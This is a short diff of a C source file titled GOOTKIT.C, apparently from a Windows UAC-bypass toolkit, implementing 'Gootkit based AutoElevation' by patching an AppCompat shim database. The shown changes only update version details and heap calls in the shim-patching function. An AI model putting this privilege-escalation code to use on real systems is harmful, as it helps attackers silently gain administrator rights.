@@ -5,9 +5,9 @@
 *
 *  TITLE:       GOOTKIT.C
 *
-*  VERSION:     2.10
+*  VERSION:     2.20
 *
-*  DATE:        16 Apr 2016
+*  DATE:        20 May 2016
 *
 *  Gootkit based AutoElevation using AppCompat.
 *
@@ -379,8 +379,8 @@ BOOL ucmShimPatch(
         if (epRVA == 0) {
             break;
         }
-
-        tmp = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 32 * 1024);
+        
+        tmp = HeapAlloc(g_ctx.Peb->ProcessHeap, HEAP_ZERO_MEMORY, 32 * 1024);
         if (tmp != NULL) {
             patchbits = (PPATCHBITS)tmp;
             sz = 0;
@@ -392,7 +392,7 @@ BOOL ucmShimPatch(
             patchbits->ActionSize = sizeof(PATCHBITS) + patchbits->PatternSize;
             sz += patchbits->ActionSize;
             SdbWriteBinaryTag(hpdb, TAG_PATCH_BITS, tmp, sz);
-            HeapFree(GetProcessHeap(), 0, tmp);
+            HeapFree(g_ctx.Peb->ProcessHeap, 0, tmp);
         }
         SdbEndWriteListTag(hpdb, patchref); // end LIBRARY-PATCH
 
